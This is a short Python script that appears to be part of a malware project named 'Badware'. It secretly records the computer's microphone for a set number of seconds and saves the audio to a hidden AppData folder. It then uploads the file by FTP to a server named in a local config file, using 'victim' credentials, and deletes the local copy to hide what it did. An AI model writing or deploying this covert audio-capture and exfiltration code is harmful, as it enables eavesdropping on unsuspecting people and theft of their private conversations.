import pyaudio
import wave
import sys
import ftplib
import os
username = os.getlogin()
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\ftpserver", "r") as servername:
	server = servername.read()
chunk = 1024  # Record in chunks of 1024 samples
sample_format = pyaudio.paInt16  # 16 bits per sample
channels = 1
fs = 44100  # Record at 44100 samples per second
seconds = int(sys.argv[1])
filename = fr'C:\users\{username}\AppData\local\Aryan\Badware\output.wav'

p = pyaudio.PyAudio()  # Create an interface to PortAudio
stream = p.open(format=sample_format,
                channels=channels,
                rate=fs,
                frames_per_buffer=chunk,
                input=True)

frames = []  # Initialize array to store frames

# Store data in chunks for 3 seconds
for i in range(0, int(fs / chunk * seconds)):
    data = stream.read(chunk)
    frames.append(data)

# Stop and close the stream 
stream.stop_stream()
stream.close()
# Terminate the PortAudio interface
p.terminate()
# Save the recorded data as a WAV file
wf = wave.open(filename, 'wb')
wf.setnchannels(channels)
wf.setsampwidth(p.get_sample_size(sample_format))
wf.setframerate(fs)
wf.writeframes(b''.join(frames))
wf.close()
session = ftplib.FTP(server,'victim','victimpass1234')
with open(fr'C:\users\{username}\AppData\local\Aryan\Badware\output.wav', 'rb') as out:
    session.storbinary('STOR output.wav', out)
session.quit()
os.remove(fr'C:\users\{username}\AppData\local\Aryan\Badware\output.wav')